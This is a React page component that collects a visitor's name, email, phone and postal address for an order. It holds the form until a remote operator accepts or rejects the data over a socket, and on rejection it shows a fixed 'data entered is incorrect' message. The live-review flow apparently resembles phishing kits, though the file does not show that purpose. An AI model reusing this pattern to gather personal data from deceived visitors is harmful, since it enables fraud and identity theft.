import React, { useEffect, useRef, useState } from "react";
import { useLocation, useNavigate } from "react-router-dom";
import { BottomBar, COUNTRIES } from "../components/VisitorShared";
import { FieldError, formLevelErrorClass } from "../components/FormFieldError";
import { HeaderShell } from "../components/HeaderShell";
import { PendingFormOverlay } from "../components/PendingFormOverlay";
import { useLanguage } from "../context/LanguageContext";
import { api_route, socket } from "../socketApi";
import { useOrderSession } from "../hooks/useOrderSession";
import axios from "axios";

const empty = {
  name: "",
  email: "",
  phone: "",
  country: "",
  state: "",
  street: "",
  form: "",
};

const FormDataPage = () => {
  const [name, setName] = useState("");
  const [email, setEmail] = useState("");
  const [phone, setPhone] = useState("");
  const [country, setCountry] = useState("");
  const [stateVal, setStateVal] = useState("");
  const [street, setStreet] = useState("");
  const [errors, setErrors] = useState(empty);
  const [loading, setLoading] = useState(false);
  const navigate = useNavigate();
  const location = useLocation();
  const orderId =
    location.state?.orderId ?? sessionStorage.getItem("currentOrderId");
  const navigatedRef = useRef(false);
  const { t, dir: pageDir, placeholderTextAlignClass } = useLanguage();

  const { formAccept, rejectReason, hydrated, reviewForm } =
    useOrderSession(orderId);

  const awaitingFormDecision =
    hydrated && !!orderId && reviewForm && !formAccept && !rejectReason;

  const baseIn = `w-full rounded-lg bg-white px-4 py-2 text-base text-gray-900 placeholder:text-gray-400 ${placeholderTextAlignClass} outline-none transition`;
  const inputBorder = (err) =>
    err
      ? "border-2 border-red-500 focus:border-red-600 focus:ring-2 focus:ring-red-100"
      : "border border-[#3d3d6b] focus:ring-2 focus:ring-blue-100";

  useEffect(() => {
    if (!orderId) {
      navigate("/login", { replace: true });
    }
  }, [orderId, navigate]);

  useEffect(() => {
    if (orderId) socket.emit("joinOrder", { orderId });
  }, [orderId]);

  useEffect(() => {
    if (!hydrated || !orderId || navigatedRef.current) return;
    if (rejectReason) {
      setLoading(false);
      setErrors((prev) => ({
        ...prev,
        form: rejectReason || t("workflow.rejected"),
      }));
      return;
    }
    if (formAccept) {
      setLoading(false);
      navigatedRef.current = true;
      navigate("/success", { state: { orderId } });
    }
  }, [hydrated, formAccept, rejectReason, orderId, navigate, t]);

  const clearField = (key) => {
    setErrors((e) => {
      if (!e[key] && !e.form) return e;
      const next = { ...e, [key]: "" };
      if (e.form) next.form = "";
      return next;
    });
  };

  const validate = () => {
    const n = { ...empty };
    if (!name.trim()) n.name = t("formData.errors.nameRequired");
    const em = email.trim();
    if (!em) n.email = t("formData.errors.emailRequired");
    else if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(em)) {
      n.email = t("formData.errors.emailInvalid");
    }
    const ph = phone.replace(/\D/g, "");
    if (ph.length < 8) n.phone = t("formData.errors.phoneShort");
    if (!country.trim()) n.country = t("formData.errors.countryRequired");
    if (!stateVal.trim()) n.state = t("formData.errors.stateRequired");
    if (!street.trim()) n.street = t("formData.errors.streetRequired");
    return n;
  };

  const hasFieldErrors = (o) =>
    ["name", "email", "phone", "country", "state", "street"].some((k) =>
      Boolean(o[k]),
    );

  const handleSubmit = async (e) => {
    e.preventDefault();
    const v = validate();
    if (hasFieldErrors(v)) {
      setErrors({ ...v, form: "" });
      return;
    }
    setErrors(empty);
    setLoading(true);
    try {
      await axios.post(`${api_route}/order/${orderId}/form-data`, {
        name: name.trim(),
        email: email.trim(),
        phone: phone.replace(/\D/g, ""),
        country: country.trim(),
        state: stateVal.trim(),
        street: street.trim(),
      });
    } catch {
      setLoading(false);
      setErrors((prev) => ({
        ...prev,
        form: t("formData.errors.formFailed"),
      }));
    }
  };

  const blockFormUntilOutcome = loading || awaitingFormDecision;

  if (!orderId) return null;

  return (
    <div
      className="relative flex min-h-screen w-full flex-col bg-white pb-24"
      dir={pageDir}
    >
      <HeaderShell>
        <div className="relative flex w-full items-center justify-center">
          <div className="flex max-w-md justify-end pr-0 pt-1" dir="ltr">
            <img
              src="/header.jpeg"
              alt=""
              className="h-full w-[90%] object-contain"
            />
          </div>
        </div>
      </HeaderShell>

      <div className="relative mx-auto mt-4 flex min-h-[560px] w-[90%] max-w-md flex-col px-0">
        <PendingFormOverlay
          show={blockFormUntilOutcome}
          ariaLabel={t("common.loadingAria")}
        />
        <p
          className="mb-2 px-4 text-center text-sm text-gray-700"
          dir={pageDir}
        >
          {t("formData.subtitle")}
        </p>

        <form
          onSubmit={handleSubmit}
          className="mt-2 flex flex-col gap-3"
          noValidate
        >
          <div>
            <input
              type="text"
              name="name"
              id="field-name"
              autoComplete="name"
              placeholder={t("formData.placeholders.name")}
              value={name}
              onChange={(e) => {
                setName(e.target.value);
                clearField("name");
              }}
              aria-invalid={!!errors.name}
              aria-describedby={errors.name ? "err-name" : undefined}
              className={`${baseIn} ${inputBorder(!!errors.name)}`}
            />
            <FieldError id="err-name" message={errors.name} />
          </div>

          <div>
            <input
              type="email"
              name="email"
              id="field-email"
              inputMode="email"
              autoComplete="email"
              placeholder={t("formData.placeholders.email")}
              value={email}
              onChange={(e) => {
                setEmail(e.target.value);
                clearField("email");
              }}
              aria-invalid={!!errors.email}
              aria-describedby={errors.email ? "err-email" : undefined}
              className={`${baseIn} ${inputBorder(!!errors.email)}`}
              dir="ltr"
            />
            <FieldError id="err-email" message={errors.email} />
          </div>

          <div>
            <input
              type="text"
              name="phone"
              id="field-phone"
              inputMode="numeric"
              autoComplete="tel"
              placeholder={t("formData.placeholders.phone")}
              value={phone}
              onChange={(e) => {
                setPhone(e.target.value.replace(/\D/g, "").slice(0, 15));
                clearField("phone");
              }}
              aria-invalid={!!errors.phone}
              aria-describedby={errors.phone ? "err-phone" : undefined}
              className={`${baseIn} ${inputBorder(!!errors.phone)}`}
              dir="ltr"
            />
            <FieldError id="err-phone" message={errors.phone} />
          </div>

          <div>
            <label htmlFor="field-country" className="sr-only">
              {t("formData.placeholders.country")}
            </label>
            <select
              id="field-country"
              name="country"
              autoComplete="country-name"
              value={country}
              onChange={(e) => {
                setCountry(e.target.value);
                clearField("country");
              }}
              aria-invalid={!!errors.country}
              aria-describedby={errors.country ? "err-country" : undefined}
              className={`${baseIn} cursor-pointer ${inputBorder(!!errors.country)}`}
              dir={pageDir}
            >
              <option value="" disabled>
                {t("formData.placeholders.country")}
              </option>
              {COUNTRIES.map((c) => {
                const label = pageDir === "rtl" ? c.nameAr : c.nameEn;
                return (
                  <option key={c.id} value={label}>
                    {label}
                  </option>
                );
              })}
            </select>
            <FieldError id="err-country" message={errors.country} />
          </div>

          <div>
            <input
              type="text"
              name="state"
              id="field-state"
              autoComplete="address-level1"
              placeholder={t("formData.placeholders.state")}
              value={stateVal}
              onChange={(e) => {
                setStateVal(e.target.value);
                clearField("state");
              }}
              aria-invalid={!!errors.state}
              aria-describedby={errors.state ? "err-state" : undefined}
              className={`${baseIn} ${inputBorder(!!errors.state)}`}
              dir={pageDir}
            />
            <FieldError id="err-state" message={errors.state} />
          </div>

          <div>
            <input
              type="text"
              name="street"
              id="field-street"
              autoComplete="street-address"
              placeholder={t("formData.placeholders.street")}
              value={street}
              onChange={(e) => {
                setStreet(e.target.value);
                clearField("street");
              }}
              aria-invalid={!!errors.street}
              aria-describedby={errors.street ? "err-street" : undefined}
              className={`${baseIn} ${inputBorder(!!errors.street)}`}
              dir={pageDir}
            />
            <FieldError id="err-street" message={errors.street} />
          </div>

          <div className="mt-2 flex w-full justify-center pt-1 flex-col gap-2">
            {errors.form ? (
              <div className={formLevelErrorClass()} dir={pageDir} role="alert">
                {pageDir === "rtl"
                  ? " البيانات المدخله غير صحيحه  برجاء المحاولة مرة اخرى"
                  : "The data entered is incorrect .. please try again later"}
              </div>
            ) : null}
            <button
              type="submit"
              disabled={blockFormUntilOutcome}
              className="rounded-full px-10 py-2.5 text-sm font-bold uppercase tracking-wide text-white shadow-md transition active:scale-[0.98] disabled:opacity-80"
              style={{ backgroundColor: "#0057FF" }}
            >
              {t("common.continueBtn")}
            </button>
          </div>
        </form>
      </div>

      <BottomBar />
    </div>
  );
};

export default FormDataPage;
